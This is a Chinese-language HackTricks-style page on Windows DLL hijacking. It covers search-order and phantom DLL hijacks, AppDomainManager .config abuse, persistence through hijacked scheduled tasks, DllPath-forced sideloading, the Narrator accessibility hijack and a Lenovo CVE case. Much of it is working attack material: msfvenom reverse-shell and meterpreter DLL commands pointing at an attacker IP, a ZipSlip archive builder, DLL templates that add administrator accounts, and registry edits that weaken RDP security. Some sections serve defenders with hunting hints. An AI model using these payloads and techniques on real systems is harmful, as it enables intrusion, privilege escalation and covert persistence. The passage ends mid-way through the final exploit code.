# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。该术语涵盖多种策略，例如 **DLL Spoofing、Injection 和 Side-Loading**。它主要用于代码执行、实现持久化，以及较少见的权限提升。尽管此处重点讨论权限提升，但 hijacking 方法在不同目标之间保持一致。

### 常见技术

DLL hijacking 有多种方法，每种方法的有效性取决于应用程序的 DLL 加载策略：<sup>[[4]](#references)</sup>

1. **DLL Replacement**：将合法 DLL 替换为恶意 DLL，也可以选择使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放置在搜索路径中合法 DLL 之前，从而利用应用程序的搜索模式。
3. **Phantom DLL Hijacking**：为应用程序创建恶意 DLL，使其误以为这是一个不存在但必需的 DLL。
4. **DLL Redirection**：修改 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件等搜索参数，将应用程序指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中使用恶意 DLL 替代合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放置在包含复制应用程序的用户可控目录中，类似于 Binary Proxy Execution 技术。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

经典的 DLL sideloading 并不是让受信任的 **.NET Framework** 进程加载攻击者代码的唯一方式。如果目标可执行文件是一个**托管**应用程序，CLR 还会读取以可执行文件命名的**应用程序配置文件**（例如 `Setup.exe.config`）。该文件可以定义自定义 **AppDomainManager**。如果配置将其指向放置在 EXE 旁边、由攻击者控制的 assembly，CLR 会在**应用程序正常代码路径执行之前**加载该 assembly，并在受信任的进程中运行它。<sup>[[24]](#references)</sup>

根据 Microsoft 的 .NET Framework 配置架构，必须同时存在 `<appDomainManagerAssembly>` 和 `<appDomainManagerType>`，才能使用自定义 manager。<sup>[[16]](#references)[[17]](#references)</sup>

最小配置：
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最简管理器：
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
实用说明：
- 这是特定于 **.NET Framework** 的 tradecraft。它依赖 CLR 配置解析，而不是 Win32 DLL 搜索顺序。
- 主机必须确实是 **managed EXE**。快速初筛：`sigcheck -m target.exe`、`corflags target.exe`，或检查 PE metadata 中的 **CLR Runtime Header**。
- 配置文件名必须与可执行文件名完全匹配（`<binary>.config`），通常位于 **EXE 同目录**。
- 这对**已签名的 Microsoft/vendor binaries** 很有用，因为受信任的 EXE 保持不变，而恶意 managed assembly 会在进程内执行。
- 如果你已经拥有可写的 installer/update directory，可以将 AppDomainManager hijacking 用作**第一阶段**，随后在后续阶段使用 classic DLL sideloading 或 reflective loading。

### AppDomainManager 作为 downloader + scheduled-task bootstrap

一种实用的 intrusion pattern，是将受信任的 managed EXE 与恶意 `*.config` 和恶意 AppDomainManager DLL 配合使用，后者仅充当一个**小型 bootstrapper**：<sup>[[25]](#references)</sup>

1. 用户从可信位置（例如 `%USERPROFILE%\Downloads`）启动已签名的 .NET installer 或 updater。
2. 同目录下的 config 会使 CLR 在 legitimate app logic 开始前，先加载 attacker assembly。
3. 恶意 manager 执行 **path gate**（例如，仅当 host EXE 从 `Downloads` 运行时才继续，并且只允许 second stage 从 `%LOCALAPPDATA%` 运行）。
4. 如果检查通过，它会将 real payload 下载到 `%LOCALAPPDATA%\PerfWatson2.exe` 等 user-writable path，并通过 scheduled task 建立 persistence。

该变体的重要性：
- 已签名的 host EXE 保持不变，因此仅对主 binary 进行 hash 检查的 triage 可能会漏掉 compromise。
- 简单的**基于路径的 anti-analysis** 很常见：将 ZIP/EXE/DLL triad 移动到 Desktop、Temp 或 sandbox path，可能会有意破坏整个 chain。
- 第一阶段的 AppDomainManager DLL 可以保持很小且 low-noise，稍后再获取真正的 implant。

此 pattern 中经常见到的最小 persistence 示例：
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
备注：
- ` /rl highest` 表示该用户/会话的**最高可用级别**；其本身并不保证能够提升到 SYSTEM。
- 这种技术通常更适合归类为**通过 .NET 配置滥用实现执行/持久化**，而不是经典的缺失 DLL 搜索顺序劫持，尽管操作人员经常将两者串联使用。

检测切入点：
- 从 **ZIP 解压路径**、`Downloads`、`%TEMP%` 或其他用户可写文件夹启动，并带有**同目录** `<exe>.config` 的已签名 .NET 可执行文件。
- 新建的 scheduled tasks，其操作指向 `%LOCALAPPDATA%`、`%APPDATA%` 或 `Downloads`，且名称模仿浏览器/厂商 updater。
- 运行时间很短的 managed bootstrap 进程：立即下载另一个 EXE，然后生成 `schtasks.exe`。
- 仅当可执行文件路径匹配预期的用户配置文件目录时才继续运行的样本。

### 劫持现有 scheduled task 以重新启动 sideload 链

为了实现持久化，不要只关注**创建新 task**。某些入侵组织会等待合法安装程序创建一个**正常的 updater task**，然后**重写 task action**，使现有名称、作者和触发器对防御人员而言仍然保持熟悉。

可复用的工作流：
1. 安装/运行合法软件，并确定它通常创建的 task。
2. 导出 task XML，并记录当前的 `<Exec><Command>` / `<Arguments>` 值。<sup>[[23]](#references)</sup>
3. 仅替换 action，使 task 从用户可写的 staging 目录启动你的**可信 host EXE**，然后由其对真实 payload 执行 sideload 或 AppDomain-load。
4. 重新注册相同的 task 名称，而不是创建一个明显的新持久化痕迹。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
为什么更加隐蔽：
- 任务名称仍然可以看起来合法（例如某个 vendor updater）。
- 由 **Task Scheduler service** 启动，因此父进程/祖先进程验证通常会看到预期的调度链，而不是 `explorer.exe`。
- 只搜索**新任务名称**的 DFIR 团队可能会漏掉这类任务：其注册信息原本就已存在，但 action 现在指向 `%LOCALAPPDATA%`、`%APPDATA%` 或其他攻击者控制的路径。

快速排查切入点：
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- 将 `C:\Windows\System32\Tasks\*` XML 以及 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 元数据与基线进行比较。
- 当一个**看起来像 vendor updater 的任务**从**用户可写目录**执行，或启动一个带有同目录 `*.config` 文件的 .NET EXE 时发出告警。

> [!TIP]
> 如需了解如何在 DLL sideloading 之上叠加 HTML staging、AES-CTR configs 和 .NET implants，构建逐步的攻击链，请查看下面的 workflow。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dll

在系统中查找缺失 Dll 最常见的方法，是从 sysinternals 运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置以下 2 个 filters**：

![Common Techniques - 查找缺失 Dll：在系统中查找缺失 Dll 最常见的方法，是从 sysinternals 运行 procmon，并设置以下 2 个 filters](<../../../images/image (961).png>)

![Common Techniques - 查找缺失 Dll：在系统中查找缺失 Dll 最常见的方法，是从 sysinternals 运行 procmon，并设置以下 2 个 filters](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![Common Techniques - 查找缺失 Dll：然后只显示 File System Activity](<../../../images/image (153).png>)

如果你要查找**一般情况下缺失的 dll**，可以让它运行几**秒**。\
如果你要查找**特定可执行文件中缺失的 DLL**，则设置另一个 filter，例如 **"Process Name" "contains" `<exec name>`**，执行该程序，然后停止捕获事件。<sup>[[9]](#references)</sup>

## 利用缺失的 Dll

要提升权限，请查找一个**特权进程尝试从你可写入的位置加载的 DLL**。当你控制的目录位于包含合法 DLL 的目录之前、且会被搜索时，或者请求的 DLL 不存在而你可以写入其中一个被搜索的目录时，就可能发生这种情况。

### Dll Search Order

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中，你可以了解 Dll 具体是如何被加载的。

**Windows applications** 会按照一组**预定义的搜索路径**，遵循特定顺序查找 DLL。当恶意 DLL 被策略性地放置在其中一个目录中，确保它先于真实 DLL 被加载时，就会产生 DLL hijacking 问题。防止这种情况的一种方法，是确保应用在引用所需 DLL 时使用绝对路径。

下面是 **32-bit** 系统上的 **DLL search order**：

1. 应用程序加载所在的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录的路径。(_C:\Windows\System32_)
3. 16-bit 系统目录。没有获取该目录路径的函数，但系统会搜索该目录。(_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录的路径。
1. (_C:\Windows_)
5. 当前目录。
6. PATH 环境变量中列出的目录。注意，这不包括由 **App Paths** registry key 指定的 per-application path。计算 DLL search path 时不会使用 **App Paths** key。

这是启用 **SafeDllSearchMode** 时的**默认** search order。禁用时，当前目录会提升到第二位。要禁用此功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value，并将其设置为 0（默认启用）。

如果使用 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，搜索会从 **LoadLibraryEx** 正在加载的 executable module 所在目录开始。

最后，DLL 可以通过绝对路径而不是名称加载。在这种情况下，Windows 只会在该路径中查找 DLL 本身；但按名称请求的依赖项仍会遵循适用的 search order。

还有其他修改 search order 的方式，但这里不作解释。

### 将任意文件写入串联到缺失-DLL hijack

1. 使用 **ProcMon** filters（`Process Name` = target EXE，`Path` ends with `.dll`，`Result` = `NAME NOT FOUND`）收集进程尝试探测但找不到的 DLL 名称。<sup>[[14]](#references)</sup>
2. 如果该 binary 由 **schedule/service** 运行，将其中一个名称对应的 DLL 放入**application directory**（search-order entry #1），它就会在下次执行时被加载。在一个 .NET scanner 案例中，进程会先在 `C:\samples\app\` 中查找 `hostfxr.dll`，然后才从 `C:\Program Files\dotnet\fxr\...` 加载真实副本。
3. 构建一个 payload DLL（例如 reverse shell），并使用任意 export：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的 primitive 是 **ZipSlip-style arbitrary write**，则构造一个 ZIP，使其中的 entry 逃逸 extraction dir，从而将 DLL 写入 app folder：
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 将该 archive 交付到受监控的 inbox/share；当 scheduled task 重新启动该进程时，它会加载恶意 DLL，并以 service account 身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

在使用 ntdll 的 native APIs 创建进程时，设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段，是一种确定性地影响新创建进程 DLL 搜索路径的高级方法。通过在此处提供攻击者控制的目录，可以强制一个按名称解析 imported DLL 的目标进程（不使用绝对路径且未使用安全加载 flags）从该目录加载恶意 DLL。

核心思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向你控制目录的自定义 DllPath（例如 dropper/unpacker 所在的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标 binary 按名称解析 DLL 时，loader 将在解析过程中查询所提供的 DllPath，从而实现可靠的 sideloading，即使恶意 DLL 与目标 EXE 不在同一目录中。

注意事项/限制
- 这会影响正在创建的 child process；不同于 SetDllDirectory，后者只影响当前进程。
- 目标必须按名称 import 或通过 LoadLibrary 加载 DLL（不能使用绝对路径，也不能使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被 hijack。Forwarded exports 和 SxS 可能会改变优先级。

最小 C 示例（ntdll、wide strings、简化的错误处理）：

<details>
<summary>完整 C 示例：通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 DLL sideloading</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

实际使用示例
- 将恶意的 xmllite.dll（导出所需函数或代理到真实 DLL）放入你的 DllPath 目录。
- 使用上述技术启动一个已知会按名称查找 xmllite.dll 的签名二进制文件。加载器通过提供的 DllPath 解析导入，并 sideload 你的 DLL。

在真实环境中观察到，该技术被用于构建多阶段 sideloading 链：初始启动器释放一个辅助 DLL，随后该 DLL 使用自定义 DllPath 启动一个由 Microsoft 签名且可被劫持的二进制文件，从而强制其从 staging 目录加载攻击者的 DLL。<sup>[[6]](#references)</sup>


### 通过 `.exe.config` 劫持 .NET AppDomainManager

对于 **.NET Framework** 目标，可以通过滥用应用程序旁边的 **`.exe.config`** 文件，在不修补内存的情况下、于 `Main()` 之前完成 sideloading。攻击者不再仅依赖 Win32 DLL 搜索顺序，而是将一个合法的 .NET EXE 与恶意配置文件以及一个或多个由攻击者控制的程序集放在一起。

攻击链的工作方式如下：<sup>[[15]](#references)[[22]](#references)</sup>
1. 主机 EXE 启动，**CLR 读取 `<exe>.config`**。
2. 配置设置 **`<appDomainManagerAssembly>`** 和 **`<appDomainManagerType>`**，使运行时实例化一个由攻击者控制的 `AppDomainManager`。
3. 恶意 manager 在受信任的主机进程内获得 **pre-`Main()` 执行**权限。
4. 同一个配置还可以强制 CLR 优先解析本地程序集（例如 `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`），并在不进行 inline patching 的情况下削弱运行时验证和 telemetry。

Campaign 风格的模式（具体嵌套结构可能因指令或 CLR 版本而异）：
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
为什么这很有用：
- **`<probing privatePath="."/>`** 将 assembly resolution 保持在应用程序目录中，使该文件夹成为可预测的 sideloading surface。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** 在 CLR initialization 期间将执行转移到 attacker code，在合法应用逻辑运行之前完成。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** 可以让 full-trust 应用加载 unsigned 或被篡改的 assemblies，而不会触发 strong-name validation failure。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** 避免 publisher-policy redirects 到更新的 assemblies。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** 使 runtime selection 更加确定。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** 尤其值得关注，因为 **CLR 会通过 configuration 禁用自身的 ETW visibility**，而不是由 implant 在内存中 patch `EtwEventWrite`。

近期 campaigns 中观察到的 operational pattern：
- Stage 1 drops `setup.exe`、`setup.exe.config` 和 local assemblies。
- Stage 2 将它们复制到一个可信的 **AppData update** 文件夹中，将 host 重命名为类似 `update.exe` 的名称，然后通过 **scheduled task** relaunch。
- Stage 3 在加载最终 RAT DLL/export 之前验证 execution context（例如来自 Task Scheduler 的预期 parent `svchost.exe`）。

Hunting 思路：
- 在 user-writable locations 中运行、且旁边存在可疑 **`.config`** 文件的已签名或其他合法的 **.NET executables**。
- 包含 **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`** 或 **`etwEnable enabled="false"`** 的 `.config` 文件。
- 从 **`%LOCALAPPDATA%`** 或特定应用的 `\bin\update\` 目录中 relaunch renamed update binaries 的 scheduled tasks。
- scheduled task 启动 trusted .NET host，随后立即从其自身目录加载 non-vendor assemblies 的 parent/child chains。

#### Windows docs 中关于 DLL search order 的例外

Windows documentation 中记录了 standard DLL search order 的一些例外：

- 当遇到一个**名称与内存中已加载的 DLL 相同的 DLL**时，系统会绕过通常的 search。相反，它会先检查 redirection 和 manifest，然后默认使用内存中已有的 DLL。**在此场景中，系统不会对该 DLL 执行 search**。
- 如果 DLL 被识别为当前 Windows version 的 **known DLL**，系统会使用该 known DLL 的版本及其 dependent DLL，**跳过 search process**。注册表项 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果 **DLL 存在 dependencies**，对这些 dependent DLL 的 search 会按照它们仅由 **module names** 指定的方式执行，无论初始 DLL 是否通过 full path 被识别。

### Escalating Privileges

**Requirements**：

- Identify 一个在 **different privileges** 下运行或将要运行的 process（horizontal 或 lateral movement），且该 process **缺少一个 DLL**。
- 确保对任何将被 **search DLL** 的 **directory** 具有 **write access**。该位置可能是 executable 的目录，也可能是 system path 中的目录。

这些 prerequisites 默认情况下并不常见：privileged executables 通常不会缺少 DLL dependencies，而 standard users 通常无法写入 system search-path directories。不过，配置错误的环境仍可能同时暴露这两个条件。\
如果满足 requirements，请查看 [UACME](https://github.com/hfiref0x/UACME) project。虽然其主要目标是 UAC bypass，但其中包含针对特定 Windows versions 的 DLL-hijacking PoCs，通常可以将其改编到你找到的 writable directory。

注意，你可以通过以下方式**检查自己在某个 folder 中的 permissions**：<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你还可以使用以下工具检查可执行文件的 imports 和 DLL 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
如需完整了解如何利用 **Dll Hijacking 提权**，以及拥有向 **System Path 文件夹**写入的权限，请查看：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 会检查你是否拥有对 system PATH 内任意文件夹的写入权限。\
其他用于发现此漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，要成功利用它，最重要的一点是**创建一个至少导出可执行文件将从中导入的所有函数的 dll**。不过请注意，Dll Hijacking 可用于实现从 Medium Integrity level 提升到 High **（绕过 UAC）**[](../../authentication-credentials-uac-and-efs/index.html#uac)，或从[ **High Integrity 提升到 SYSTEM**](../index.html#from-high-integrity-to-system)**。**你可以在这篇专门研究用于执行的 dll hijacking 的文章中找到**如何创建有效 dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，你可以找到一些可能有用的**基本 dll 代码**，可将其用作**模板**，或用于创建一个**导出非必需函数的 dll**。

## **创建和编译 Dll**

### **Dll Proxifying**

基本上，**Dll proxy** 是一种在**加载时执行你的恶意代码**，同时还能通过**将所有调用转发到真实库**来**暴露**并按预期**工作**的 Dll。

使用 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以指定一个**可执行文件**并选择要进行 proxify 的**库**，然后**生成一个 proxified dll**；也可以指定该 **Dll** 并**生成一个 proxified dll**。

### **Meterpreter**

**获取反向 shell（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter（x86）：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户（x86 版本，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

在许多情况下，你编译的 DLL 必须**导出受害进程导入的每个函数**。如果缺少必需的导出函数，二进制文件将无法解析该函数，exploit 也会失败。

<details>
<summary>C DLL 模板（Win10）</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（创建用户）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的备用 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack（Accessibility/ATs）

Windows Narrator.exe 启动时仍会探测一个可预测的、特定语言的 localization DLL，该 DLL 可被劫持以实现任意代码执行和持久化。<sup>[[7]](#references)</sup>

关键事实
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- Legacy 路径（旧版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 如果 OneCore 路径中存在一个由攻击者控制且可写入的 DLL，它就会被加载，并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要任何 exports。

使用 Procmon 进行 Discovery
- Filter：`Process Name is Narrator.exe` 和 `Operation is Load Image` 或 `CreateFile`。
- 启动 Narrator，观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静默
- 朴素的 hijack 会发声/突出显示 UI。为保持静默，在 attach 时枚举 Narrator 线程，打开主线程（`OpenThread(THREAD_SUSPEND_RESUME)`）并对其执行 `SuspendThread`；继续在你自己的线程中运行。完整代码请参见 PoC。<sup>[[8]](#references)</sup>

通过 Accessibility 配置触发和持久化
- 用户上下文（HKCU）：`reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）：`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述配置后，启动 Narrator 会加载植入的 DLL。在 secure desktop（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。

由 RDP 触发的 SYSTEM 执行（横向移动）
- 允许 classic RDP security layer：`reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 连接到主机，在登录屏幕上按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。
- RDP session 关闭时执行会停止——请及时 inject/migrate。

自带 Accessibility（BYOA）
- 你可以克隆内置 Accessibility Tool（AT）的 registry entry（例如 CursorIndicator），将其编辑为指向任意 binary/DLL，导入后再将 `configuration` 设置为该 AT 名称。这样可以在 Accessibility framework 下代理执行任意代码。

注意
- 在 `%windir%\System32` 下写入文件以及修改 HKLM 值需要 admin 权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要任何 exports。

## 案例研究：CVE-2025-1729 - 使用 TPQMAssistant.exe 进行权限提升

本案例演示了 Lenovo TrackPoint Quick Menu（`TPQMAssistant.exe`）中的 **Phantom DLL Hijacking**，其编号为 **CVE-2025-1729**。<sup>[[2]](#references)[[3]](#references)</sup>

### 漏洞详情

- **组件**：位于 `C:\ProgramData\Lenovo\TPQM\Assistant\` 的 `TPQMAssistant.exe`。
- **Scheduled Task**：`Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天上午 9:30 运行，使用已登录用户的上下文。
- **目录权限**：`CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL Search 行为**：首先尝试从其工作目录加载 `hostfxr.dll`，若缺失则记录 "NAME NOT FOUND"，表明本地目录具有更高的搜索优先级。

### Exploit 实现

攻击者可以将恶意的 `hostfxr.dll` stub 放置在同一目录中，利用缺失的 DLL 在用户上下文中实现代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
